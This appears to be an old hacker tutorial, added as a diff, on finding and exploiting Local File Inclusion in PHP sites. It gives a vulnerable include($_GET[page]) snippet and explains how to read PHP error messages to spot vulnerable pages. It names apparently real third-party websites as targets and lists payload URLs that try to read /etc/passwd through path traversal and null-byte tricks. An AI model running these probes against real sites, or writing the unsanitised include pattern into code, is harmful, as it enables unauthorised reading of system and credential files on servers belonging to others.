@@ -1,0 +1,101 @@
+Local File Inclusion Tutorial - Written by Xasulrev
+
+[- How to Find LFI Vulnerability -]
+
+How to Find LFI Vulnerability, Well i use me of adding ..
+Example
+
+www.site.com/index.php?p=.. 
+
+
+
+
+
+Real World Examples:
+
+http://www.jedit.org/index.php?page=..
+
+
+
+
+Warning: main(...html): failed to open stream: No such file or directory in /home/groups/j/je/jedit/htdocs/index.php on line 
+ 63 
+ 
+Warning: main(): Failed opening '...html' for inclusion (include_path='.:/usr/local/share/pear') in /home/groups/j/je/jedit/htdocs/index. 
+php on line 63
+
+
+
+
+This is not Vulnerable,
+A Vulnerable should look like
+
+Warning: include() [function.include]: Failed opening '...php' for inclusion (include_path='.:/usr/share/pear') in / 
+home/shiner/shiner.com/htdocs/beers/beers-home.php on line 62
+
+
+
+
+include is the code , the script is using for example
+
+ 
+ 
+<?php 
+$page = $_GET[page]; 
+include($page); 
+?> 
+
+
+
+
+Should be [function.include]
+but
+
+ 
+<?php 
+$page = $_GET[page]; 
+require_once($page); 
+?> 
+
+
+
+
+should be [function.require_once] or [function.require]
+
+[- Find Example (Real) -]
+
+http://www.crew4sea.com/indexm.php?url=..
+
+
+
+
+Gives us.
+
+Fatal error: require_once() [function.require]: Failed opening required './..' (include_path='.:/:/usr/php/pear' 
+) in /indexm.php on line 164
+
+
+
+
+ [b][function.require][/b]
+
+
+
+
+So we know it Vulnerable
+
+if Windows OS, you can just do
+
+http://www.crew4sea.com/indexm.php?url=indexm.php
+
+
+
+
+
+other try
+http://www.crew4sea.com/indexm.php?url=/etc/passwd
+http://www.crew4sea.com/indexm.php?url=/etc/passwd%00
+http://www.crew4sea.com/indexm.php?url=../etc/passwd
+http://www.crew4sea.com/indexm.php?url=../etc/passwd%00
+
+until you get Something.
